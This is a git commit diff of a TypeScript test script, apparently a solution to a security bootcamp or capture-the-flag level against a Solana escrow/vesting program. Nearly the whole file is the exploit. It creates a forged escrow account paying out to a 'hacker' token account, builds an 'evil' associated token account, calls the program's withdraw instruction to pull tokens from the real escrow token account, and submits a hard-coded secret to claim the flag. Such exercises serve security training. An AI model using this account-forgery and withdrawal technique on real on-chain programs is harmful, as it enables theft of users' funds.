ed75c572eab1150b586792a5bf6a5f04adf0e377
Hvbris <44342309+hvbr1s@users.noreply.github.com>
2024-10-06 10:29:50 +0200

    Update level-4.ts

--- bootcamp/level-4.ts
+++ bootcamp/level-4.ts
@@ -1,6 +1,7 @@
 import * as anchor from "@coral-xyz/anchor";
 import * as web3 from "@solana/web3.js";
 import * as spl from "@solana/spl-token"
+import * as borsh from "@coral-xyz/borsh"
 import { Level4 } from "../target/types/level_4";
 import * as path from 'path';
 import * as fs from 'fs';
@@ -12,12 +13,7 @@ const ESCROW_TOKEN_ACCOUNT = new web3.PublicKey("2Me5B53SU2z5eC5ig8oyMuWosryVyMj
 const HACKER_TOKEN_ACCOUNT = new web3.PublicKey("RzJdKwZLe2hB8KgsE87YwXJQKTHFnAGiV4hAuC94nGa")
 const SENDER = new web3.PublicKey("J6oF4UUqWEW7YW3c4CNHWZybe2oMYSpHni8Su445fkt5")
 const SENDER_TOKEN_ACCOUNT = new web3.PublicKey("2CoFvgSNNV7oZcujdPV7Pe79GUdBuLkTKZvuKDZASrp8")
-const ESCROW_RECIPIENT = new web3.PublicKey("H6hsz95AWEzCeHzvnXhs84gDxuiKdmZ6qgKtWqVFZfQJ")
-
-
-
-const SECRET = ""
-
+const SECRET = "69c5c9e5f885370d387e0d019c48f1629ab7cbfeb29e628dcebe2f78b0c2dacd"
 
 
 describe("level-4", async () => {
@@ -25,74 +21,101 @@ describe("level-4", async () => {
   anchor.setProvider(provider);
 
   const hacker = load_keypair('../accounts/hacker.json');
+  const mockEscrowKeypair = anchor.web3.Keypair.generate();
+  console.log(`Mock Escrow PubKey -> ${mockEscrowKeypair.publicKey}`)
   const program = anchor.workspace.Level4 as anchor.Program<Level4>;
 
   let escrowPdaAuthority: any;
-  let attackEscrow : any;
-  let EVIL_PDA : any;
+  let attackEscrow: any;
+  let attackEscrowATA: any;
 
 
   before("Setup", async () => {
     await airdrop(provider.connection, hacker.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);
 
     [escrowPdaAuthority] = anchor.web3.PublicKey.findProgramAddressSync([anchor.utils.bytes.utf8.encode("ESCROW_PDA_AUTHORITY")], program.programId);
+
+
   });
 
-  it("Inspect escrow", async () => {  
-    const escrow = await program.account.escrow.fetch(ESCROW);
-    console.log(escrow);
-  });
-
-  it('Creates a mock Escrow account', async () => {
-
-    const mockEscrowKeypair = anchor.web3.Keypair.generate();
-    console.log(`Mock Escrow PubKey -> ${mockEscrowKeypair.publicKey}`)
-    const startTime = new anchor.BN(Math.floor(Date.now() / 1000)); // Current timestamp
-    const interval = new anchor.BN(1); // Smallest possible interval (1 second)
-    const endTime = startTime.add(new anchor.BN(10));
+  it("creates a mock Escrow account", async () => {
+    const ESCROW_DISCRIMINATOR = [31, 213, 123, 187, 186, 22, 218, 155];
   
     const mockEscrow = {
       recipient: HACKER_TOKEN_ACCOUNT,
       mint: USDC,
-      amount: new anchor.BN('2001000'),
-      withdrawal: new anchor.BN('0'), 
-      startTime: startTime,
-      endTime: endTime,
-      interval: interval,
-    };  
-    // Calculate the space required for the account
-    const ESCROW_SIZE = 8 + 32 + 100;
+      amount: new anchor.BN('1e8868', 16),
+      withdrawal: new anchor.BN(0),
+      startTime: new anchor.BN('66ed1b89', 16),
+      endTime: new anchor.BN('66ed4299', 16),
+      interval: new anchor.BN(5),
+    };
   
-    // Create the account
-    const createAccountInstruction = anchor.web3.SystemProgram.createAccount({
-      fromPubkey: provider.wallet.publicKey,
-      newAccountPubkey: mockEscrowKeypair.publicKey,
-      space: ESCROW_SIZE,
-      lamports: 1000000000,
-      programId: program.programId,
-    });
-    console.log(createAccountInstruction)
-
-    // send transaction
-    const transaction = new anchor.web3.Transaction()
-    .add(createAccountInstruction)
-    
-    const signature = await provider.sendAndConfirm(transaction, [mockEscrowKeypair]);
-    console.log('Mock Escrow account created successfully. Signature:', signature);
-    await new Promise(resolve => setTimeout(resolve, 2000));
-
-    attackEscrow = mockEscrowKeypair.publicKey;
+    try {
+      const tx = await program.methods.initVesting(
+        mockEscrow.recipient,
+        mockEscrow.amount,
+        mockEscrow.startTime,
+        mockEscrow.endTime,
+        mockEscrow.interval
+      )
+      .accounts({
+        sender: hacker.publicKey,
+        senderTokenAccount: HACKER_TOKEN_ACCOUNT,
+        escrow: mockEscrowKeypair.publicKey,
+        escrowTokenAccount: ESCROW_TOKEN_ACCOUNT,
+        mint: USDC,
+        tokenProgram: spl.TOKEN_2022_PROGRAM_ID,
+        systemProgram: web3.SystemProgram.programId,
+      })
+      .signers([hacker, mockEscrowKeypair])
+      .rpc();
+  
+      console.log("Transaction signature:", tx);
+  
+      // Fetch the created account to verify its contents
+      const escrowAccount = await program.account.escrow.fetch(mockEscrowKeypair.publicKey);
+      console.log("Created Escrow account:", escrowAccount);
+      attackEscrow = escrowAccount
+  
+    } catch (error) {
+      console.error("Error:", error);
+      if (error instanceof anchor.AnchorError) {
+        console.log("Error logs:", error.logs);
+      }
+    }
   });
 
-  it ("derives an evil PDA", async () => {
-    const [evilPDA] = web3.PublicKey.findProgramAddressSync(
-      [Buffer.from("ESCROW_PDA_AUTHORITY",), hacker.publicKey.toBuffer()],
-      program.programId,
+  it ("derives and create an evil ATA", async () => {
+    const attackEscrowAta =  await spl.getAssociatedTokenAddress(
+      USDC,
+      mockEscrowKeypair.publicKey,
+      false,
+      spl.TOKEN_2022_PROGRAM_ID,
+      spl.ASSOCIATED_TOKEN_PROGRAM_ID
     );
-    console.log(evilPDA)
-    EVIL_PDA = evilPDA
+    console.log(`Evil ATA Address-> ${attackEscrowAta}`)
 
-  })
+    const tx = new anchor.web3.Transaction().add(
+      spl.createAssociatedTokenAccountInstruction(
+        hacker.publicKey, // payer
+        attackEscrowAta, // ata
+        mockEscrowKeypair.publicKey, // owner
+        USDC, // mint
+        spl.TOKEN_2022_PROGRAM_ID,
+        spl.ASSOCIATED_TOKEN_PROGRAM_ID
+      )
+    );
+
+    await anchor.web3.sendAndConfirmTransaction(provider.connection, tx, [hacker]);
+
+    // Verify the ATA was created
+    const accountInfo = await provider.connection.getAccountInfo(attackEscrowAta);
+    console.log(`Evil ATA Account Owner -> ${accountInfo.owner}`)
+
+    attackEscrowATA = attackEscrowAta
+
+  });
 
   it ("Withdraw", async () => {
     const withdraw = await program.methods.withdrawUnlocked()
@@ -101,7 +124,7 @@ describe("level-4", async () => {
       recipientTokenAccount: HACKER_TOKEN_ACCOUNT,
       escrow: attackEscrow,
       escrowTokenAccount: ESCROW_TOKEN_ACCOUNT,
-      escrowPdaAuthority: EVIL_PDA,
+      escrowPdaAuthority: escrowPdaAuthority,
       mint: USDC,
       tokenProgram: spl.TOKEN_2022_PROGRAM_ID,
       systemProgram: web3.SystemProgram.programId
@@ -112,17 +135,16 @@ describe("level-4", async () => {
     console.log(withdraw);
 
   })
-  
 
 
-  it("Reveals secrets", async () => {
+ it("Reveals secrets", async () => {
 
     const airdropSignature = await provider.connection.requestAirdrop(
       hacker.publicKey,
-      1000000000 // 1 SOL
+      1000000000 
     );
     await provider.connection.confirmTransaction(airdropSignature);
-    // Create the transaction
+    
     const tx = await program.methods.revealSecret(SECRET)
       .accounts({
         hacker: hacker.publicKey,
@@ -131,17 +153,17 @@ describe("level-4", async () => {
       })
       .transaction();
   
-    // Sign the transaction
+    
     tx.feePayer = hacker.publicKey;
     tx.recentBlockhash = (await provider.connection.getLatestBlockhash()).blockhash;
     tx.sign(hacker);
   
-    // Send the transaction
+    
     const txid = await provider.connection.sendRawTransaction(tx.serialize()); 
-    await new Promise(resolve => setTimeout(resolve, 2000)); 
+    await new Promise(resolve => setTimeout(resolve, 1000)); 
     console.log("Transaction confirmed. Signature:", txid);
   
-    // Optional: Fetch the transaction details
+    
     const txDetails = await provider.connection.getTransaction(txid, {
       commitment: 'confirmed',
       maxSupportedTransactionVersion: 0
@@ -151,7 +173,7 @@ describe("level-4", async () => {
     console.log("Transaction details:", txDetails);
   
   });
-})
+});
 
 
 async function airdrop(connection: any, address: any, amount = 1000000000) {
